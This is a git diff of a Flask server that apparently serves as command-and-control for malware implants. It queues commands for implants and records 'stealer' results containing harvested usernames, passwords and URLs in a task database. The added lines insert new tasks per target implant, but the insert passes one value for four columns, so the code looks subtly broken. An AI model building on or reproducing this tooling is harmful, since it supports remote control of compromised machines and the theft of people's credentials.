@@ -85,7 +85,7 @@ def handle_execute():
         print(f"Failure sending commands: {error}")
         return error, {'Access-Control-Allow-Origin': config.clientURL}
 
-# List all commands for a particular implant
+# List all commands for a particular implant, with steg
 
 
 @app.route("/get_qcommands", methods=["POST"])
@@ -220,22 +220,35 @@ def handle_response_stealer():
             data)
         task_id = data['task_id']
         success = data['success']
+        target_implant_id = data['target_implant_id']
         if success in ['Success', 'success']:
             success = True
         else:
             success = False
         response_data = "Stealer: response recieved. Check logs for this implant to see response."
-
+        
         if ((len(username_list) not in [len(password_list), len(url_list)])):
             print("error: username list not same length as password list")
-
+        
         query = "UPDATE task_queue SET status = 'executed', response_data = %s, success = %s, recieved_on = %s WHERE task_id= %s"
         time = datetime.now()
-        print(response_data, success, time, task_id)
         response = tools.executeGenericVar(
             query, [response_data, success, time, task_id])
         if response == []:
             print("\n\nupdate task queue worked\n\n")
+
+
+        columns = ['task_id', 'target_implant_id', 'status', 'creator']
+
+        data = target_implant_id, 
+        print("About to send query")
+        print(data)
+        print(current_user)
+        query = tools.insertQueryBuilder("task_queue", columns, ["task_id"])
+        print(f"data: {data}")
+        db_resp = tools.executeInsertQuery(query, data)
+        print(db_resp)
+
 
         # TODO
         # ingi look at /response_json for how to update tables
